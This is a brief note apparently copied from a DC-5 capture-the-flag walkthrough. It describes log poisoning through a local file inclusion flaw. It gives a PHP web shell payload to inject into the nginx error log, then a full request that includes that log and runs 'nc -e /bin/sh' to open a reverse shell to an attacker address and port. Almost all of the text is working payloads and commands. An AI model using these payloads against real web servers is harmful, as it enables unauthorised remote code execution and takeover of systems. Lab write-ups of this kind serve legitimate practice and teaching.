Ripped from a dc5 walkthrough

https://github.com/mzfr/vulnhub-writeups/blob/master/2019-07-09-DC5.md

    send the following in a request after your vulnrable paramater

<?php system($_GET["cmd"]) ?>

    find your log file (in this instance it was in /var/log/nginx/error.log)
    append the following to a request to read the log file

&cmd=nc -e /bin/sh IP-of-you-machine PORT

full thing would look like so

/thankyou.php?file=/var/log/nginx/error.log&cmd=nc -e /bin/sh 192.168.121.149 1337

found it easier to test this in burp, but cna confirm this does work in browser too
